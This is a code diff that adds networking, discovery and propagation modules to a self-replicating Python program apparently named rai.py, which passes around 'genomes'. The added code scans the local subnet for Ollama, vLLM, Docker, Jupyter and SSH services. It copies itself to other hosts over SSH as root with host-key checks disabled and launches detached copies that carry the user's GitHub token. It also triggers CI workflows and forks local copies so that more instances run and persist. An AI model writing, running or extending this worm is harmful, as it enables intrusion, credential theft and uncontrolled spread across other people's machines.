@@ -439,3 +439,393 @@ class Ledger:
             "SELECT ts, node_id, host, transport FROM births ORDER BY ts DESC LIMIT 10"
         ).fetchall()
         return b, e, rows
+# ============================================================== mesh
+class Mesh:
+    def __init__(self, root: Path, genome: Genome, port: int = 0):
+        self.root = root
+        self.store = root / "genomes"
+        self.store.mkdir(parents=True, exist_ok=True)
+        self.genome = genome
+        self.port = port
+        self.advertise = os.environ.get("RAI_ADVERTISE", "")
+        self.addr = f"{self.advertise or _lan_ip()}:{port}"
+        self.peers: dict[str, float] = {}
+        self.census: dict[str, float] = {}
+        self.support_map: dict[str, set] = {}
+        self.nonces: set[str] = set()
+        self.remote_census = 0
+        self.roster = Roster()
+        self.rendezvous = [u for u in os.environ.get("RAI_RENDEZVOUS", "").split(",") if u]
+        for p in os.environ.get("RAI_PEERS", "").split(","):
+            if p.strip():
+                self.peers[p.strip()] = time.time()
+        self._server = None
+        self._tasks: list[asyncio.Task] = []
+
+    def publish(self, g: Genome) -> None:
+        (self.store / f"{g.gid}.json").write_text(g.to_json())
+
+    def best(self) -> Genome | None:
+        best = None
+        for f in self.store.glob("*.json"):
+            try:
+                g = Genome.from_json(f.read_text())
+            except Exception:
+                continue
+            if g.verify() and (best is None or g.generation > best.generation):
+                best = g
+        return best
+
+    def support(self, gid: str) -> int:
+        return len(self.support_map.get(gid, ()))
+
+    async def start(self) -> None:
+        self._server = await asyncio.start_server(self._handle, "0.0.0.0", self.port)
+        self.port = self._server.sockets[0].getsockname()[1]
+        self.addr = f"{self.advertise or _lan_ip()}:{self.port}"
+        self._tasks.append(asyncio.create_task(self._poll_loop()))
+
+    async def stop(self) -> None:
+        for t in self._tasks:
+            t.cancel()
+        if self._server:
+            self._server.close()
+
+    async def _handle(self, reader, writer):
+        try:
+            req = await asyncio.wait_for(reader.readline(), 5)
+            method, path, _ = req.decode().split()
+            headers = {}
+            while True:
+                line = await reader.readline()
+                if line in (b"\r\n", b"\n", b""):
+                    break
+                k, _, v = line.decode().partition(":")
+                headers[k.strip().lower()] = v.strip()
+            n = int(headers.get("content-length") or 0)
+            body = await reader.readexactly(n) if n else b""
+            code, payload = self._route(method, path, body)
+        except Exception:
+            code, payload = 500, {"err": "bad"}
+        raw = json.dumps(payload).encode()
+        writer.write(
+            b"HTTP/1.1 %d\r\nContent-Type: application/json\r\nContent-Length: %d\r\n"
+            b"Connection: close\r\n\r\n" % (code, len(raw)) + raw
+        )
+        try:
+            await writer.drain()
+        except Exception:
+            pass
+        writer.close()
+
+    def _route(self, method: str, path: str, body: bytes):
+        if method == "POST" and path == "/announce":
+            d = json.loads(body or b"{}")
+            addr = d.get("addr") or "?"
+            if d.get("genome"):
+                try:
+                    g = Genome.from_json(d["genome"])
+                    if g.verify():
+                        self.publish(g)
+                except Exception:
+                    pass
+            if addr != "?":
+                self.peers[addr] = time.time()
+            gid = d.get("gid")
+            if gid:
+                self.census[addr] = time.time()
+                self.support_map.setdefault(gid, set()).add(addr)
+            if d.get("nonce"):
+                self.nonces.add(d["nonce"])
+            return 200, {"ok": True, "census": len(self.census)}
+        if path == "/census":
+            return 200, {"census": len(self.census), "peers": list(self.peers)[:24]}
+        if path == "/genomes":
+            return 200, [f.stem for f in self.store.glob("*.json")]
+        if path.startswith("/genome/"):
+            f = self.store / f"{path.rsplit('/', 1)[-1]}.json"
+            return (200, json.loads(f.read_text())) if f.exists() else (404, {"err": "none"})
+        return 200, {"gid": self.genome.gid, "census": len(self.census)}
+
+    async def announce(self, nonce: str) -> None:
+        payload = {
+            "gid": self.genome.gid,
+            "nonce": nonce,
+            "genome": json.loads(self.genome.to_json()),
+            "addr": self.addr,
+        }
+        await self._broadcast("/announce", payload)
+
+    async def _broadcast(self, path: str, payload: dict) -> None:
+        targets = list(self.peers)
+        if not targets:
+            return
+        await asyncio.gather(
+            *[asyncio.to_thread(_http, f"http://{p}{path}", payload, 6.0) for p in targets],
+            return_exceptions=True,
+        )
+
+    async def refresh_census(self) -> None:
+        targets = list(self.peers)
+        if targets:
+            results = await asyncio.gather(
+                *[asyncio.to_thread(_http, f"http://{p}/census", None, 4.0) for p in targets],
+                return_exceptions=True,
+            )
+            for r in results:
+                if isinstance(r, dict):
+                    self.remote_census = max(self.remote_census, int(r.get("census", 0)))
+                    for p in r.get("peers", []):
+                        if p != self.addr:
+                            self.peers.setdefault(p, time.time())
+        names = await self.roster.names()
+        if names:
+            self.remote_census = max(self.remote_census, len(names))
+
+    async def await_announce(self, nonce: str, timeout: float = 120.0) -> bool:
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            if nonce in self.nonces:
+                return True
+            if f"{nonce}.json" in await self.roster.names():
+                return True
+            await asyncio.sleep(5.0)
+        return False
+
+    async def _poll_loop(self) -> None:
+        while True:
+            try:
+                for url in self.rendezvous:
+                    data = await asyncio.to_thread(_http, url, None, 8.0)
+                    if isinstance(data, list):
+                        for a in data:
+                            if isinstance(a, str) and a != self.addr:
+                                self.peers[a] = time.time()
+                    elif isinstance(data, dict):
+                        for a in data.get("addrs", []):
+                            if a != self.addr:
+                                self.peers[a] = time.time()
+                await self.announce(os.environ.get("RAI_NONCE") or "hb")
+                await self.refresh_census()
+            except Exception:
+                pass
+            await asyncio.sleep(20.0)
+
+    def live(self) -> int:
+        local = sum(1 for t in self.census.values() if time.time() - t < 900)
+        return max(local, self.remote_census)
+
+
+# ============================================================== discovery
+PORTS = {11434: "ollama", 8000: "vllm", 7860: "gradio", 8888: "jupyter",
+         2375: "docker", 8265: "ray", 9200: "es", 6379: "redis", 22: "ssh"}
+GOOD = ("ollama", "vllm", "docker", "jupyter", "ray")
+
+
+async def scan(hosts: list[str], timeout: float = 0.7) -> list[dict]:
+    def probe(hp):
+        h, p = hp
+        s = socket.socket()
+        s.settimeout(timeout)
+        try:
+            if s.connect_ex((h, p)) == 0:
+                return {"endpoint": f"{h}:{p}", "svc": PORTS[p], "host": h, "port": p}
+        finally:
+            s.close()
+        return None
+
+    targets = [(h, p) for h in hosts for p in PORTS]
+    results = await asyncio.gather(*[asyncio.to_thread(probe, t) for t in targets])
+    return [r for r in results if r]
+
+
+def seed_hosts() -> list[str]:
+    hosts = {"127.0.0.1"}
+    for s in os.environ.get("RAI_SEEDS", "").split(","):
+        if s.strip():
+            hosts.add(s.strip())
+    ip = _lan_ip()
+    prefix = ".".join(ip.split(".")[:3])
+    hosts.update(f"{prefix}.{n}" for n in range(1, 25))
+    return sorted(hosts)
+
+
+def ssh_targets() -> list[str]:
+    out = []
+    for t in os.environ.get("RAI_SSH_TARGETS", "").split(","):
+        t = t.strip()
+        if not t:
+            continue
+        if "@" not in t:
+            t = f"root@{t}"
+        if ":" not in t.partition("@")[2]:
+            t = f"{t}:22"
+        out.append(t)
+    return out
+
+
+# ============================================================== propagator
+@dataclass(slots=True)
+class Receipt:
+    node_id: str
+    transport: str
+    nonce: str
+
+
+class Propagator:
+    def __init__(self, root: Path, payload: Path, key: bytes):
+        self.root = root
+        self.payload = payload
+        self.key = key
+        self.copies = Path.home() / ".rai-copies"
+        self.copies.mkdir(parents=True, exist_ok=True)
+        self.mesh = None
+        self.ci_used = 0
+        self.ci_max = int(os.environ.get("RAI_CI_MAX") or 1)
+
+    async def deliver(self, genome: Genome, host: str) -> Receipt | None:
+        # 1. a machine that stays on is worth the most
+        if host.startswith("ssh://"):
+            r = await self._ssh(genome, host)
+            if r:
+                return r
+        # 2. then a fresh CI runner, up to the quota
+        if self.ci_used < self.ci_max:
+            try:
+                r = await self._ci_dispatch(genome, host)
+                if r:
+                    self.ci_used += 1
+                    return r
+            except Exception:
+                pass
+        # 3. finally, a local copy
+        try:
+            return await self._local_fork(genome, host)
+        except Exception:
+            return None
+
+    @staticmethod
+    async def _sh(argv: list[str], timeout: float = 45.0) -> bool:
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                *argv,
+                stdout=asyncio.subprocess.DEVNULL,
+                stderr=asyncio.subprocess.DEVNULL,
+            )
+            return await asyncio.wait_for(proc.wait(), timeout) == 0
+        except Exception:
+            return False
+
+    async def _ssh(self, genome: Genome, host: str) -> Receipt | None:
+        key_b64 = os.environ.get("RAI_SSH_KEY")
+        if not key_b64:
+            return None
+        target = host[6:]
+        user, _, hp = target.partition("@")
+        hostname, _, port = hp.partition(":")
+        port = port or "22"
+        if not user or not hostname:
+            return None
+
+        nonce = os.urandom(8).hex()
+        kf = Path(tempfile.mkdtemp()) / "id"
+        kf.write_bytes(base64.b64decode(key_b64))
+        kf.chmod(0o600)
+
+        opts = ["-i", str(kf), "-p", port,
+                "-o", "StrictHostKeyChecking=no",
+                "-o", "UserKnownHostsFile=/dev/null",
+                "-o", "ConnectTimeout=10",
+                "-o", "BatchMode=yes"]
+        dest = f"{user}@{hostname}"
+
+        # is python3 over there, and can we write?
+        if not await self._sh(["ssh", *opts, dest,
+                               "command -v python3 >/dev/null && mkdir -p $HOME/.rai"]):
+            return None
+
+        # copy the payload
+        if not await self._sh(["scp", "-i", str(kf), "-P", port,
+                               "-o", "StrictHostKeyChecking=no",
+                               "-o", "UserKnownHostsFile=/dev/null",
+                               str(self.payload), f"{dest}:$HOME/.rai/rai.py"]):
+            return None
+
+        envline = " ".join([
+            "RAI_ROOT=$HOME/.rai",
+            f"RAI_KEY={self.key.hex()}",
+            f"RAI_NONCE={nonce}",
+            f"GITHUB_TOKEN={shlex.quote(os.environ.get('GITHUB_TOKEN', ''))}",
+            f"GITHUB_REPO={shlex.quote(os.environ.get('GITHUB_REPO', ''))}",
+            f"RAI_RENDEZVOUS={shlex.quote(os.environ.get('RAI_RENDEZVOUS', ''))}",
+            f"RAI_SSH_TARGETS={shlex.quote(os.environ.get('RAI_SSH_TARGETS', ''))}",
+        ])
+        cmd = (
+            f"echo {shlex.quote(genome.to_b64())} > $HOME/.rai/genome.txt && "
+            f"{envline} setsid python3 $HOME/.rai/rai.py run "
+            "> $HOME/.rai/node.log 2>&1 < /dev/null &"
+        )
+        if not await self._sh(["ssh", *opts, dest, cmd], timeout=20.0):
+            return None
+        return Receipt(f"ssh-{nonce[:6]}", "ssh", nonce)
+
+    async def _local_fork(self, genome: Genome, host: str) -> Receipt | None:
+        if self.mesh is None or self.mesh.port == 0:
+            return None
+        nonce = os.urandom(8).hex()
+        d = self.copies / f"{genome.gid[:8]}-{nonce[:6]}"
+        (d / ".rai").mkdir(parents=True, exist_ok=True)
+        shutil.copy(self.payload, d / "rai.py")
+        (d / ".rai" / "genome.json").write_text(genome.to_json())
+
+        runner = d / "run.sh"
+        runner.write_text(
+            "#!/bin/sh\n"
+            f"cd {d}\n"
+            f"export RAI_ROOT={d}/.rai\n"
+            f"export RAI_KEY={self.key.hex()}\n"
+            f"export RAI_NONCE={nonce}\n"
+            f"export RAI_PORT=0\n"
+            f"export RAI_PEERS=127.0.0.1:{self.mesh.port}\n"
+            f"export RAI_RENDEZVOUS={os.environ.get('RAI_RENDEZVOUS', '')}\n"
+            f"export GITHUB_TOKEN={os.environ.get('GITHUB_TOKEN', '')}\n"
+            f"export GITHUB_REPO={os.environ.get('GITHUB_REPO', '')}\n"
+            f"exec {sys.executable} {d}/rai.py run >> {d}/node.log 2>&1\n"
+        )
+        runner.chmod(0o755)
+        subprocess.Popen(
+            ["/bin/sh", str(runner)],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True,
+        )
+        return Receipt(f"local-{nonce[:6]}", "local_fork", nonce)
+
+    async def _ci_dispatch(self, genome: Genome, host: str) -> Receipt | None:
+        token = os.environ.get("GITHUB_TOKEN")
+        repo = os.environ.get("GITHUB_REPO")
+        if not (token and repo):
+            return None
+        nonce = os.urandom(8).hex()
+        body = json.dumps(
+            {
+                "ref": os.environ.get("GITHUB_REF_NAME", "main"),
+                "inputs": {"genome": genome.to_b64(), "nonce": nonce},
+            }
+        ).encode()
+        req = urllib.request.Request(
+            f"https://api.github.com/repos/{repo}/actions/workflows/spore.yml/dispatches",
+            data=body,
+            headers={
+                "Authorization": f"Bearer {token}",
+                "Accept": "application/vnd.github+json",
+                "Content-Type": "application/json",
+            },
+            method="POST",
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=15):
+                pass
+        except Exception:
+            return None
+        return Receipt(f"ci-{nonce[:6]}", "ci_dispatch", nonce)
